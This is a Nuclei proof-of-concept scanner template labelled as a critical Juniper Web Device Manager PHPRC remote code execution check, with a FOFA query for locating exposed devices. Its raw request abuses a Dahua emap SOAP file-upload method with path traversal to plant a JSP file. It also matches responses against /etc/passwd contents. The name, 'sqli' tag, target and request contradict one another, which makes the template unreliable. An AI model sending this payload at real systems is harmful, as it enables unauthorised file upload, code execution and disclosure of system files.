nuclei-poc/nuclei-JUNIPer-Web-PHPRC-rce.yaml

id: JUNIPer-Web-PHPRC-rce
info:
  name: JUNIPer-Web-PHPRC-rce
  author: sb
  severity: critical
  tags: sqli
  metadata:
    fofa-query: app="JUNIPer-Web-Device-Manager"
variables:
  s1: '{{rand_base(5, "56789")}}'
  str: '{{rand_base(4)}}'
  rand: '{{rand_base(3)}}'
http:
  - raw:
      - |
        POST /emap/webservice/gis/soap/poi HTTP/1.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
           <soapenv:Header/>
           <soapenv:Body>
              <res:uploadPicFile>
                 <arg0>/../../{{s1}}.jsp</arg0>
                 <arg1>{{s1}}</arg1>
              </res:uploadPicFile>
           </soapenv:Body>
        </soapenv:Envelope>
      - |
        GET /emap/webservice/gis/soap/poi HTTP/1.1      
        
    payloads:
      rce:
        - "/etc/passwd"
    req-condition: true    
    matchers-condition: and             
    matchers:     
      - type: regex
        part: body
        regex:
          - 'root:.*:0:0:'
        

        